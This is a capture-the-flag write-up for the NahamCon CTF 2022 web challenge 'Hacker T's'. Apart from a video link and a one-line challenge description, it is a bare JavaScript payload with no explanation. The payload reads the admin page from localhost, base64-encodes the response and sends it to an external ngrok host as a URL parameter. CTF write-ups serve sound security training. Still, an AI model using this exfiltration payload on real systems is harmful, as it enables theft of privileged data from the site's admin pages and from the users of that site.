---
name: Hacker T's (2022)
event: NahamCon CTF 2022
category: Web
description: Writeup for Hacker T's (Web) - NahamCon CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Hacker T's

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/ttsFRYkL8wQ/0.jpg)](https://youtu.be/ttsFRYkL8wQ?t=1362 "NahamCon CTF 2022: Hacker T's")

## Description

> We all love our hacker t-shirts. Make your own custom ones.

## Solution

{% code overflow="wrap" %}
```js
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost:5000/admin");
xhr.onload = function () {
    var flag = btoa(xhr.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET", "http://9106-81-103-153-174.ngrok.io?flag=" + flag);
    exfil.send();
};
xhr.send();
```
{% endcode %}
